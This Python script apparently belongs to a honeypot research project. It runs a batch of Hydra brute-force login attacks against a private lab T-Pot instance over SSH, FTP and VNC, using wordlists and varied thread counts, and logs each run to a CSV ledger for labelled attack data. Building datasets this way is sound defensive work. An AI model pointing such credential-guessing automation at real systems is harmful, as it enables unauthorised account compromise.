#!/usr/bin/env python3
import csv, os, shlex, subprocess, time
from datetime import datetime, timezone

LEDGER  = "/mnt/c/tpot-project/01-run-ledger/run-ledger.csv"
LOG_DIR = "/mnt/c/tpot-project/02-raw-data/attack-logs"
WL      = "/mnt/c/tpot-project/03-scripts/wordlists"
TARGET  = "192.168.32.138"
SRC     = "192.168.32.1"
LABEL   = "brute_force"
PREFIX  = "B"
COOLDOWN = 60
MAX_RUNS = None

COLUMNS = ["run_id","attack_type_label","tool","exact_command","target_ip",
           "target_port","start_time_utc","end_time_utc","expected_honeypot",
           "src_ip_seen","notes"]

def utc_now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def rows_done():
    if not os.path.exists(LEDGER): return 0
    n = 0
    for r in csv.DictReader(open(LEDGER, newline="")):
        if r["run_id"].startswith(PREFIX) and r["run_id"][1:].isdigit(): n += 1
    return n

def parse_hydra(out):
    found = 0
    for line in out.splitlines():
        if "valid password found" in line:
            for tok in line.split():
                if tok.isdigit(): found = int(tok); break
    creds = [l.strip() for l in out.splitlines() if "login:" in l and "password:" in l]
    return (f"HIT x{found}: " + "; ".join(creds[:3])) if found else \
           "no valid creds (expected for low-interaction / all-wrong)"

def build_commands():
    U, T, C, E = f"{WL}/users.txt", f"{WL}/pw_tiny.txt", f"{WL}/pw_common.txt", f"{WL}/pw_ext.txt"
    R = f"{WL}/pw_recol_ssh.txt"
    H = TARGET
    ssh = [
        (f"-I -t 4 -l root -P {T} ssh://{H}",   22, "Cowrie", 240, "ssh root tiny"),
        (f"-I -t 4 -l root -P {C} ssh://{H}",   22, "Cowrie", 240, "ssh root common"),
        (f"-I -t 4 -l root -P {E} ssh://{H}",   22, "Cowrie", 240, "ssh root ext"),
        (f"-I -t 4 -L {U} -P {T} ssh://{H}",    22, "Cowrie", 240, "ssh userlist tiny"),
        (f"-I -t 4 -L {U} -P {C} ssh://{H}",    22, "Cowrie", 300, "ssh userlist common"),
        (f"-I -t 4 -L {U} -P {E} ssh://{H}",    22, "Cowrie", 360, "ssh userlist ext"),
        (f"-I -t 1 -l root -P {C} ssh://{H}",   22, "Cowrie", 300, "ssh root common slow t1"),
        (f"-I -t 8 -l root -P {E} ssh://{H}",   22, "Cowrie", 240, "ssh root ext fast t8"),
        (f"-I -t 1 -L {U} -P {T} ssh://{H}",    22, "Cowrie", 300, "ssh userlist tiny slow"),
        (f"-I -t 8 -L {U} -P {C} ssh://{H}",    22, "Cowrie", 300, "ssh userlist common fast"),
        (f"-I -t 4 -l admin -P {C} ssh://{H}",  22, "Cowrie", 240, "ssh admin common"),
        (f"-I -t 4 -l oracle -P {T} ssh://{H}", 22, "Cowrie", 180, "ssh oracle tiny"),
        (f"-I -t 4 -W 1 -L {U} -P {T} ssh://{H}",22,"Cowrie", 240, "ssh userlist tiny W1"),
        (f"-I -t 2 -l root -P {T} ssh://{H}",   22, "Cowrie", 180, "ssh root tiny t2"),
        (f"-I -t 2 -l root -P {C} ssh://{H}",   22, "Cowrie", 240, "ssh root common t2"),
        (f"-I -t 2 -L {U} -P {C} ssh://{H}",    22, "Cowrie", 300, "ssh userlist common t2"),
        (f"-I -t 4 -l ubuntu -P {C} ssh://{H}", 22, "Cowrie", 240, "ssh ubuntu common"),
        (f"-I -t 4 -l root -P {E} ssh://{H}",   22, "Cowrie", 240, "ssh root ext repeat"),
    ]
    other = [
        # --- kept: FTP (Dionaea logs real USER+PASS attempts) ---
        (f"-I -t 4 -L {U} -P {T} ftp://{H}",    21, "Dionaea", 180, "ftp userlist tiny"),
        (f"-I -t 4 -l root -P {C} ftp://{H}",   21, "Dionaea", 180, "ftp root common"),
        (f"-I -t 4 -L {U} -P {C} ftp://{H}",    21, "Dionaea", 240, "ftp userlist common"),
        # --- B022-B024: re-collected as SSH (RDP logged no credentials) ---
        (f"-I -t 4 -l root -P {R} ssh://{H}",   22, "Cowrie", 300, "ssh root recol t4"),
        (f"-I -t 2 -l root -P {R} ssh://{H}",   22, "Cowrie", 400, "ssh root recol t2"),
        (f"-I -t 8 -l root -P {R} ssh://{H}",   22, "Cowrie", 240, "ssh root recol t8"),
        # --- kept: VNC (Heralding logs real password attempts) ---
        (f"-I -t 4 -P {T} vnc://{H}",           5900, "Heralding", 120, "vnc tiny (no user)"),
        (f"-I -t 4 -P {C} vnc://{H}",           5900, "Heralding", 120, "vnc common"),
        # --- B027-B030: re-collected as SSH (MySQL/Telnet/MSSQL logged no usable attempts) ---
        (f"-I -t 4 -l admin -P {R} ssh://{H}",  22, "Cowrie", 300, "ssh admin recol t4 (pure-fail)"),
        (f"-I -t 1 -L {U} -P {R} ssh://{H}",    22, "Cowrie", 900, "ssh userlist recol t1"),
        (f"-I -t 4 -L {U} -P {R} ssh://{H}",    22, "Cowrie", 500, "ssh userlist recol t4"),
        (f"-I -t 2 -l root -P {C} ssh://{H}",   22, "Cowrie", 300, "ssh root common-toor t2"),
    ]
    return ssh + other

def main():
    os.makedirs(os.path.dirname(LEDGER), exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    new = not os.path.exists(LEDGER)
    cmds = build_commands()
    done = rows_done()
    todo = cmds[done:][:MAX_RUNS] if MAX_RUNS is not None else cmds[done:]
    if not todo:
        print("Nothing to run — ledger already has all brute-force runs."); return

    with open(LEDGER, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=COLUMNS)
        if new: w.writeheader()
        idx = done + 1
        first_start = last_end = None
        for args, port, hp, tmo, note in todo:
            rid = f"{PREFIX}{idx:03d}"; idx += 1
            shell = f"timeout -k 5 {tmo} hydra {args}"
            print(f"[{rid}] {note}\n       {shell}")
            start = utc_now(); first_start = first_start or start
            try:
                res = subprocess.run(shlex.split(shell), capture_output=True,
                                     text=True, timeout=tmo + 30)
                out = res.stdout + "\n" + res.stderr
                timed = res.returncode == 124
            except subprocess.TimeoutExpired as e:
                out = (e.stdout or "") + "\nBACKSTOP TIMEOUT"; timed = True
            end = utc_now(); last_end = end
            open(f"{LOG_DIR}/{rid}.txt", "w").write(out)
            result = parse_hydra(out) + (" [TIMED OUT]" if timed else "")
            w.writerow({"run_id":rid,"attack_type_label":LABEL,"tool":"hydra",
                        "exact_command":"hydra "+args,"target_ip":TARGET,"target_port":port,
                        "start_time_utc":start,"end_time_utc":end,"expected_honeypot":hp,
                        "src_ip_seen":SRC,"notes":f"{note} | {result}"})
            f.flush()
            print(f"       {start} -> {end}   {result}   (cooldown {COOLDOWN}s)\n")
            time.sleep(COOLDOWN)
    print(f"Batch window (UTC): {first_start} -> {last_end}")

if __name__ == "__main__":
    main()
